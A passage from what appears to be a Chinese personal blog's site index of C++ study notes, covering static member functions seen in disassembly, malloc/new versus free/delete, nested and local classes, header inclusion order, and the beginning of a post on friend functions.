class="number">00</span> <span class="number">00</span>       push        <span class="number">0</span>C8h  </span><br><span class="line"><span class="number">00</span>EA1018 <span class="number">6</span>A <span class="number">64</span>                push        <span class="number">64</span>h  </span><br><span class="line"><span class="number">00</span><span class="function">EA101A E8 E1 FF FF FF       call        <span class="title">Box::test</span> <span class="params">(<span class="number">0</span>EA1000h)</span>  </span></span><br><span class="line"><span class="function">00EA101F 83 C4 08             add         esp,8  </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">return</span> 0</span>;</span><br><span class="line"><span class="number">00</span>EA1022 <span class="number">33</span> C0                <span class="keyword">xor</span>         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00</span>EA1024 <span class="number">5</span>D                   pop         ebp  </span><br><span class="line"><span class="number">00</span>EA1025 C3                   ret </span><br></pre></td></tr></table></figure><p>参数入栈没啥毛病，都是从右往左，call的时候也是正常跳转函数<br>然后函数结束完后主动恢复栈平衡add esp,8<br>但是会注意到明明是b1调用的，但是却没有出现ecx。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="number">00</span>EA1002 EC                   in          al,dx  </span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line"><span class="number">00</span>EA1003 <span class="number">8B</span> <span class="number">45</span> <span class="number">08</span>             mov         eax,dword ptr [a]  </span><br><span class="line"><span class="number">00</span>EA1006 <span class="number">03</span> <span class="number">45</span> <span class="number">0</span>C             add         eax,dword ptr [b]  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00</span>EA1009 <span class="number">5</span>D                   pop         ebp  </span><br><span class="line"><span class="number">00</span>EA100A C3                   ret</span><br></pre></td></tr></table></figure><p>至于这个函数本身是没调用类的成员，也没有出现ecx。</p><p>所以说当你用b1调用静态成员函数和直接作用域调用是一样的。它没有this指针。</p><p><strong>所以静态成员函数不能访问类的非静态成员变量</strong></p><hr><h2 id="类是否一定有构造函数"><a href="#类是否一定有构造函数" class="headerlink" title="类是否一定有构造函数"></a>类是否一定有构造函数</h2><p>刚学类的时候就说了，类默认都会有一个构造函数和析构函数，如果没定义，那就是自动生成一个空的构造函数和析构函数。</p><p>至于在编译器编译的时候，为什么没看到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Box b1;</span><br><span class="line"><span class="comment">//b1.Add(100, 200);</span></span><br><span class="line"></span><br><span class="line">b1.<span class="built_in">test</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line"><span class="number">00</span>EA1013 <span class="number">68</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push        <span class="number">0</span>C8h  </span><br><span class="line"><span class="number">00</span>EA1018 <span class="number">6</span>A <span class="number">64</span>                push        <span class="number">64</span>h  </span><br><span class="line"><span class="number">00</span><span class="function">EA101A E8 E1 FF FF FF       call        <span class="title">Box::test</span> <span class="params">(<span class="number">0</span>EA1000h)</span>  </span></span><br><span class="line"><span class="function">00EA101F 83 C4 08             add         esp,8</span></span><br></pre></td></tr></table></figure><p>就拿这个来说，实例化对象b1，没有自动调用构造，首先是因为没定义，其次就是本身就是空的构造。那么有没有意义都不大，就被编译器主动删掉了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>还是有点糙，就是简单的分析</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc和new</title>
      <link href="/2022/06/24/mallocornew/"/>
      <url>/2022/06/24/mallocornew/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>类的几个基本点差不多了，后续还有重载多态…</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>当然不是配套就行，还要知道为什么配套。</p><hr><h2 id="malloc和new"><a href="#malloc和new" class="headerlink" title="malloc和new"></a>malloc和new</h2><p>对于基本数据类型，malloc和new没啥区别。<br>但是对于类而言，malloc是仅分配内存，而new除了分配内存还会调用它的构造函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s_count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; ++s_count &lt;&lt; <span class="string">&quot;个构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后malloc分配看看会不会调用构造函数<code>Box *b1 = (Box *)malloc(sizeof(Box) * 10);</code></p><img src="/2022/06/24/mallocornew/000.png" class=""><p>看到什么都没有发生。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s_count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; ++s_count &lt;&lt; <span class="string">&quot;个构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在类中加一个成员变量。</p><p>打印测试：<img src="/2022/06/24/mallocornew/001.png" class=""><br>看到是值不正常。这其实就是因为malloc不适合类，它只是做了无脑的内存分配。</p><p>在做new之前，先将项目属性的标准调到c++17，因为static静态的一开始没法初始化，自增的时候有点问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="keyword">inline</span> <span class="type">static</span> <span class="type">int</span> s_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; ++s_count &lt;&lt; <span class="string">&quot;个构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以把它声明成内联的，做一个初始化定义。<br>然后new十个看看先：<img src="/2022/06/24/mallocornew/002.png" class=""><br>发现调用了构造函数。<br>然后它也可以访问成员变量x</p><img src="/2022/06/24/mallocornew/003.png" class=""><hr><h2 id="free和delete"><a href="#free和delete" class="headerlink" title="free和delete"></a>free和delete</h2><p>用free去释放new的内存空间本身问题也不大，但是对于类，如果设置了析构函数就会</p><img src="/2022/06/24/mallocornew/004.png" class=""><p>正常释放一个new的空间用delete自然会调用析构函数</p><img src="/2022/06/24/mallocornew/005.png" class=""><p>所以说malloc和free不适合类，只适合基本数据类型。<br>而new和delete才适合类，前者能调用构造函数，后者能调用析构函数。</p><hr><h2 id="delete和delete"><a href="#delete和delete" class="headerlink" title="delete和delete[]"></a>delete和delete[]</h2><p>delete是释放单个new的元素，delete[]自然就是释放一片连续的内存，而且会挨个调用析构函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Box *b2 = <span class="keyword">new</span> Box[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">delete</span>[] b2;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/mallocornew/006.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>所以当动态分配对象只是普通数据类型，那么malloc&#x2F;free 或者 new&#x2F;delete问题倒不是很大。<br>但是如果对象是类，就只能使用new&#x2F;delete。因为new会调用构造函数。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嵌套类模块化问题</title>
      <link href="/2022/06/24/nestedlib/"/>
      <url>/2022/06/24/nestedlib/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前的模块化是编译成.lib。在单文件下还好，多文件下还是有点问题。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Weapon.h&quot;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Weapon</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>::Weapon&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Weapon.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">Hack::Weapon hw;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/nestedlib/000.png" class=""><p>发现编译器提示使用一个不完整的类。</p><p>但是当他们都写在.cpp源文件的时候反而不报错。</p><p>显然是头文件之间出现了问题。因为两个头文件相互引用，而预编译阶段就是展开头文件。<br>所以当互相调用的时候，就不能确定先展开谁，因为无论先展开谁，都会有一个缺失了，导致类不完整。</p><p>当追究主次的时候，我们知道，Hack肯定先声明，Weapon可以后声明，也就是说Hack.h不是必要引用Weapon.h的。<br>谁想用就让谁引用，这里自然是.cpp源文件要引用。<br>所以修改Hack.h头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Weapon</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/nestedlib/001.png" class=""><p>回头看声明是合法的。没有报错了。</p><blockquote><p>就跟先有鸡还是先有蛋相似。。都是逻辑问题。没什么好硬扯的。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>聪明的大宝贝还能用<code>#ifdef</code>之类的去判重。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嵌套类</title>
      <link href="/2022/06/24/nested/"/>
      <url>/2022/06/24/nested/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嵌套反正不是第一次用了，嵌套类还算陌生，毕竟友元不算。<br>要说稍微接近一点的也是命名空间，但总归不是一个东西。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>设计一个角色：</p><ol><li>生命值</li><li>内力值</li><li>武器<ol><li>强化等级</li><li>品阶</li></ol></li></ol><p>可能第一印象是用struct结构体，当然也没毛病，因为类用的少，得心应手还是结构体，不过反正要慢慢过渡。</p><hr><h2 id="定义嵌套类"><a href="#定义嵌套类" class="headerlink" title="定义嵌套类"></a>定义嵌套类</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">weapon</span>&#123;</span><br><span class="line"><span class="type">short</span> lv;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">weaponLv</span>&#123;</span><br><span class="line">normal = <span class="number">0</span>,</span><br><span class="line">high,</span><br><span class="line">rare,</span><br><span class="line">myth</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>嵌套写法在结构层次上感知会更强，前提是里面的类不需要给别的类用，毕竟嵌套在里面作用域也就在里面了。</p><p>调用嵌套类就要用<code>::</code>表明作用域。<br>比如这里的<code>Hack::weapon lv;</code></p><blockquote><p>注：嵌套类的作用域也受封装属性管辖，即private封装的结构体无法被外部调用。</p></blockquote><hr><p>既然已经学了文件分级写，那么.h就应该都是声明，定义都放在.cpp里面</p><p>这里要改动的就是嵌套的类，当然要注意嵌套类的作用域问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hack.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">WeaponLv</span>&#123;</span><br><span class="line">normal = <span class="number">0</span>,</span><br><span class="line">high,</span><br><span class="line">rare,</span><br><span class="line">myth</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Weapon</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Hack.h这样写没问题。</p><p>但是.cpp要注意</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">weapon</span>&#123;</span><br><span class="line"><span class="type">short</span> lv;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">weaponLv</span>&#123;</span><br><span class="line">normal = <span class="number">0</span>,</span><br><span class="line">high,</span><br><span class="line">rare,</span><br><span class="line">myth</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样写是定义新的类，跟嵌套没关系了，要加上作用域，至于类的作用域写法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>::Weapon&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Weapon</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">short</span> lv;</span><br><span class="line">WeaponLv wlv;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Weapon</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Hack::Weapon::<span class="built_in">Weapon</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;lv = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">Hack::Weapon::~<span class="built_in">Weapon</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;析构函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hack::Weapon hw;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/nested/000.png" class=""><p>可以看到能够实例化一个嵌套类，因为我们设置了构造和析构时打印。</p><blockquote><p>ps:当时想把定义放在Hack.cpp的，但是由于跨文件，编译成.obj的时候会重复定义就很烦<br>手动写成内联又有点多此一举。</p></blockquote><hr><p>然后是嵌套类指针的问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>::Weapon&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Weapon</span>();</span><br><span class="line"></span><br><span class="line"><span class="function">Weapon *<span class="title">returnW</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">short</span> lv;</span><br><span class="line">WeaponLv wlv;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Weapon</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果说写成这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Weapon* Hack::Weapon::<span class="built_in">returnW</span>()&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是行不通的，因为这个类是嵌套的，无法直接调用这个类型，所以指针的时候也要写上作用域：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hack::Weapon* Hack::Weapon::<span class="built_in">returnW</span>()&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就ok了。就是感觉套多了看着也恶心不习惯。</p><blockquote><p>所以说嫌麻烦就塞到头文件得了</p></blockquote><hr><h2 id="访问权限"><a href="#访问权限" class="headerlink" title="访问权限"></a>访问权限</h2><ol><li>嵌套类可以访问外层类的所有静态成员</li><li>外层类仅能访问嵌套类的公有成员</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Weapon</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hh;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/nested/001.png" class=""><p>可以看到静态的成员变量和函数都能够访问不报错。</p><img src="/2022/06/24/nested/002.png" class=""><p>但是像常规的就无法访问了，因为常规的涉及到内存分配，它不是提前就分配好的。</p><p><strong>即便静态的成员变量和函数处在private下，嵌套类依旧能访问</strong></p><p>换过来，外层类对嵌套类的访问权限。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>::Weapon&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Weapon</span>();</span><br><span class="line"></span><br><span class="line"><span class="function">Weapon *<span class="title">returnW</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">short</span> lv;</span><br><span class="line">WeaponLv wlv;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Weapon</span>();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>目前嵌套类里面有这么多成员</p><img src="/2022/06/24/nested/003.png" class=""><p>可以看到它除了私有的x无法调用，其他都能调用。</p><hr><h2 id="局部类"><a href="#局部类" class="headerlink" title="局部类"></a>局部类</h2><p>定义在函数类的内被称为局部类</p><ol><li>局部类的定义必须写在类中</li><li>局部类中不允许使用静态成员变量</li><li>局部类可以访问全局变量</li></ol><p>因为函数出栈就释放了。。。所以尽量避免把类写在函数里。<br>不能使用静态成员也是这个道理，函数出栈就没了，这个静态的就成了僵尸内存了。。至于静态成员函数有争议，但是我认为也是不能用，都是一个道理的，提前划分了，但是函数是出栈就释放，变量和函数都成了无人认领的。</p><p>最后能访问全局这个无伤大雅，毕竟全局是大哥啊，不能访问还叫什么全局。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>写多了记得注释。。不如阅读起来都恶心</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>友元</title>
      <link href="/2022/06/24/friend/"/>
      <url>/2022/06/24/friend/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>友元是一种定义在类外部的普通函数或类，但它需要在类体内进行说明，为了与该类的成员函数加以区别，在说明时前面加以关键字friend。友元不是成员函数，但是它可以访问类中的私有成员。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>老样子写个类。</p><hr><h2 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h2><p>当类中成员没有声明是public的时候，即便你用类当参数模板，也是无法调用的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>&#123;</span><br><span class="line">b.hp = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/friend/000.png" class=""><p>结果就是无法访问。</p><p>而按照友元的逻辑，需要告诉这个类你有一个朋友，<code>friend void test(Box &amp;b);</code><br>这样你的朋友才能了解你的相关事物。</p><img src="/2022/06/24/friend/001.png" class=""><p>然后就不会报错了。</p><p>说明友元访问私有变量是没啥问题，还能访问私有函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Box.h</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span 